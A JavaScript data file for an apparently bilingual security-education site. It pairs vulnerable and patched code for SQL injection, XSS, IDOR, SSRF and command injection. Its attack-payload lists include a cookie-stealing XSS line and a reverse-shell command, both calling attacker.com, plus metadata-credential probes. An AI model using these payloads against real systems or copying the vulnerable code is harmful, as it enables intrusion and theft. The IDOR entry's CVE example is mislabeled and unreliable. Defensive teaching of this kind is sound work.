// Detailed Vulnerability Exploit & Mitigation Database for OWASP Top 10
export const OWASP_VULNERABILITIES = [
  {
    id: 'sqli',
    titleAr: 'حقن قواعد البيانات (SQL Injection)',
    titleEn: 'SQL Injection (SQLi)',
    cveExample: 'CVE-2023-34362 (MOVEit Transfer SQLi)',
    severity: 'Critical',
    cvss: '9.8',
    summaryAr: 'إدخال استعلامات SQL غير منقاة في حقول المدخلات لتغيير منطق الاستعلام والوصول لكامل بيانات الجداول.',
    impactAr: 'تسريب كامل لقواعد البيانات، كسر شاشات تسجيل الدخول، وتعديل أو حذف السجلات، وقد يؤدي في بعض الحالات لتنفيذ أوامر على نظام التشغيل (xp_cmdshell).',
    vulnerableCode: `
# ❌ كود غير آمن (Vulnerable Python/Flask Code):
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # دمج مباشر للمدخلات داخل الاستعلام (Concatenation)
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor.execute(query)
    user = cursor.fetchone()
    if user:
        return "Welcome Admin!"
    return "Invalid credentials"
    `,
    mitigatedCode: `
# ✅ كود آمن مرقع (Secure Parameterized Query):
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # استخدام الاستعلامات المجهزة (Parameterized Query)
    # محرك الـ DB يتعامل مع المدخلات كبيانات بحتة وليست كوداً تنفيذياً
    query = "SELECT id, password_hash FROM users WHERE username = %s"
    cursor.execute(query, (username,))
    user = cursor.fetchone()
    
    if user and bcrypt.check_password_hash(user['password_hash'], password):
        return "Welcome Admin!"
    return "Invalid credentials"
    `,
    attackPayloads: [
      "' OR 1=1 --",
      "' UNION SELECT null, username, password FROM users --",
      "admin' --",
      "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --"
    ],
    detectionTips: [
      'اختبار وضع علامة التنصيص المفردة (\') ومراقبة ظهور رسائل خطأ SQL مثل (syntax error, unclosed quotation mark).',
      'مقارنة استجابة الصفحة عند إدخال تعبير منطقي صحيح (\' OR 1=1) مقابل تعبير خاطئ (\' OR 1=2).',
      'استخدام دوال التأخير الزمني (Time-Based) مثل `SLEEP(5)` لفحص الثغرات العمياء.'
    ]
  },

  {
    id: 'xss',
    titleAr: 'البرمجة عبر المواقع (Cross-Site Scripting)',
    titleEn: 'Cross-Site Scripting (XSS)',
    cveExample: 'CVE-2023-41053 (NodeBB Stored XSS)',
    severity: 'High',
    cvss: '8.2',
    summaryAr: 'حقن كود جافاسكربت خبيث في صفحات الويب ليتم تنفيذه في متصفح المستخدمين الآخرين.',
    impactAr: 'سرقة رموز الجلسات (Session Cookies)، الاستيلاء على الحسابات، تشغيل هجمات تصيد احتيالي وهمية، وتحويل المستخدمين لمواقع خبيثة.',
    vulnerableCode: `
// ❌ كود غير آمن (Vulnerable Node.js / Express):
app.get('/search', (req, res) => {
    const term = req.query.q;
    // طباعة مدخلات المستخدم مباشرة في كود الـ HTML دون ترميز
    res.send(\`<h1>Results for: \${term}</h1>\`);
});
    `,
    mitigatedCode: `
// ✅ كود آمن مرقع (Context-Aware HTML Encoding):
const escapeHtml = require('escape-html');

app.get('/search', (req, res) => {
    const term = req.query.q;
    // ترميز الحروف الخاصة (&, <, >, ", ') لتظهر كنص بريء فقط
    const safeTerm = escapeHtml(term);
    res.send(\`<h1>Results for: \${safeTerm}</h1>\`);
});
// بالإضافة لتفعيل سياسة Content Security Policy (CSP):
// Content-Security-Policy: default-src 'self'; script-src 'self'
    `,
    attackPayloads: [
      "<script>alert(document.cookie)</script>",
      "<img src=x onerror=this.src='http://attacker.com/steal?c='+document.cookie>",
      "<svg onload=alert(1)>",
      "javascript:alert(document.domain)"
    ],
    detectionTips: [
      'البحث عن أماكن انعكاس المدخلات في الـ Source Code ومعرفة هل تقع داخل وسوم HTML أم داخل خصائص (Attributes) أم سياق جافاسكربت.',
      'تتبع رد فعل الصفحة عند إرسال أحرف الاستكشاف: `< > " \' / ;`.'
    ]
  },

  {
    id: 'idor',
    titleAr: 'التلاعب المباشر بمعرفات الكائنات (IDOR / BOLA)',
    titleEn: 'Insecure Direct Object References (IDOR)',
    cveExample: 'CVE-2022-26134 (Confluence Insecure Access)',
    severity: 'High',
    cvss: '8.5',
    summaryAr: 'سماح التطبيق للمستخدم بالوصول إلى بيانات أو تعديل سجلات تخص مستخدمين آخرين بمجرد تغيير رقم المعرف في الرابط أو الطلب.',
    impactAr: 'تسريب فواتير العملاء، تعديل كلمات سر الآخرين، وتحميل ملفات حساسة غير مصرح بها.',
    vulnerableCode: `
# ❌ كود غير آمن (Vulnerable FastAPI Endpoint):
@app.get("/api/v1/invoice/{invoice_id}")
async def get_invoice(invoice_id: int):
    # يجلب الفاتورة برقمها فقط دون التأكد من هوية صاحب الطلب!
    invoice = db.query(Invoice).filter(Invoice.id == invoice_id).first()
    return invoice
    `,
    mitigatedCode: `
# ✅ كود آمن مرقع (Enforcing Ownership Check):
@app.get("/api/v1/invoice/{invoice_id}")
async def get_invoice(invoice_id: int, current_user: User = Depends(get_current_active_user)):
    # التحقق من أن الفاتورة المطلوبة تخص المستخدم المسجل حالياً أو أنه مسؤول عام
    invoice = db.query(Invoice).filter(
        Invoice.id == invoice_id, 
        Invoice.user_id == current_user.id
    ).first()
    
    if not invoice:
        raise HTTPException(status_code=404, detail="Invoice not found or unauthorized")
    return invoice
    `,
    attackPayloads: [
      "GET /api/v1/user/101/profile -> GET /api/v1/user/102/profile",
      "POST /api/v1/account/delete?user_id=500",
      "GET /documents/download?file=statement_2026_0012.pdf"
    ],
    detectionTips: [
      'إنشاء حسابين تجريبيين (مستخدم A ومستخدم B) في التطبيق.',
      'اعتراض طلبات المستخدم A في Burp Suite ومحاولة استبدال المعرفات لتشير لموارد تخص المستخدم B والتحقق هل تم الوصول بنجاح.'
    ]
  },

  {
    id: 'ssrf',
    titleAr: 'حقن الخادم العشوائي (Server-Side Request Forgery)',
    titleEn: 'Server-Side Request Forgery (SSRF)',
    cveExample: 'CVE-2021-26855 (Microsoft Exchange Proxylogon SSRF)',
    severity: 'Critical',
    cvss: '9.8',
    summaryAr: 'استغلال وظيفة في الخادم تطلب روابط خارجية (مثل جلب صورة أو فحص رابط) لإجباره على توجيه طلبات لأنظمة داخلية في الشبكة أو خدمات البيانات الوصفية السحابية.',
    impactAr: 'سرقة مفاتيح الـ IAM على AWS و Azure، تخطي الجدران النارية، والوصول للوحات تحكم السيرفرات الداخلية غير المكشوفة للإنترنت.',
    vulnerableCode: `
# ❌ كود غير آمن (Vulnerable Python):
@app.route('/fetch_avatar')
def fetch_avatar():
    url = request.args.get('url')
    # الخادم يستدعي الرابط مباشرة دون تدقيق عنوان الـ IP الهدف
    response = requests.get(url)
    return response.content
    `,
    mitigatedCode: `
# ✅ كود آمن مرقع (Whitelisting & Private IP Blocking):
import ipaddress
from urllib.parse import urlparse

def is_safe_url(target_url):
    parsed = urlparse(target_url)
    # السماح ببروتوكولات https فقط
    if parsed.scheme != 'https':
        return False
    # حل النطاق والتأكد من أنه ليس عنوان IP داخلي أو شبكة خاصة
    ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
    if ip.is_private or ip.is_loopback or ip.is_link_local:
        return False
    return True
    `,
    attackPayloads: [
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "http://127.0.0.1:8080/admin",
      "http://localhost:6379/ (Redis probe)",
      "file:///etc/passwd"
    ],
    detectionTips: [
      'البحث عن أي خاصية في التطبيق تستقبل روابط كمدخلات (مثل استيراد رابط صورة، فحص Webhook، أو تحويل صفحة لـ PDF).',
      'استخدام أداة Burp Collaborator لمعرفة هل يقوم الخادم بالاتصال الفعلي بالرابط الخارجي.'
    ]
  },

  {
    id: 'rce',
    titleAr: 'تنفيذ الأوامر عن بعد (Remote Code / Command Execution)',
    titleEn: 'Remote Code Execution (RCE) & Command Injection',
    cveExample: 'CVE-2021-44228 (Log4Shell Remote Code Execution)',
    severity: 'Critical',
    cvss: '10.0',
    summaryAr: 'تمرير مدخلات المستخدم مباشرة إلى دالة تنفيذ أوامر النظام (مثل system أو exec) مما يتيح له تشغيل أوامر نظام التشغيل بالكامل.',
    impactAr: 'سيطرة تامة ومطلقة على الخادم، تشغيل Reverse Shell، زرع برمجيات خبيثة، والسيطرة على الشبكة بالكامل.',
    vulnerableCode: `
# ❌ كود غير آمن (Vulnerable PHP):
<?php
$target_ip = $_GET['ip'];
// تمرير المدخلات مباشرة لشيل النظام!
$output = shell_exec("ping -c 3 " . $target_ip);
echo "<pre>$output</pre>";
?>
    `,
    mitigatedCode: `
# ✅ كود آمن مرقع:
<?php
$target_ip = $_GET['ip'];
// 1. التحقق الصارم من أن المدخلات عنوان IP حقيقي فقط
if (!filter_var($target_ip, FILTER_VALIDATE_IP)) {
    die("Invalid IP Address!");
}
// 2. استخدام دوال تنقية وفصل المعاملات بدلاً من دمج النصوص
$escaped_ip = escapeshellarg($target_ip);
$output = shell_exec("ping -c 3 " . $escaped_ip);
echo "<pre>" . htmlspecialchars($output) . "</pre>";
?>
    `,
    attackPayloads: [
      "127.0.0.1; whoami",
      "127.0.0.1 && cat /etc/passwd",
      "127.0.0.1 | nc attacker.com 4444 -e /bin/sh",
      "`id`"
    ],
    detectionTips: [
      'حقن قواطع الأوامر في كل حقل يرسل للسيرفر: `;`, `&&`, `|`, `$(...)`, `` ` ``.',
      'استخدام أمر النوم `sleep 5` أو `ping -c 5` وملاحظة هل استغرق الخادم 5 ثوانٍ للرد.'
    ]
  }
];
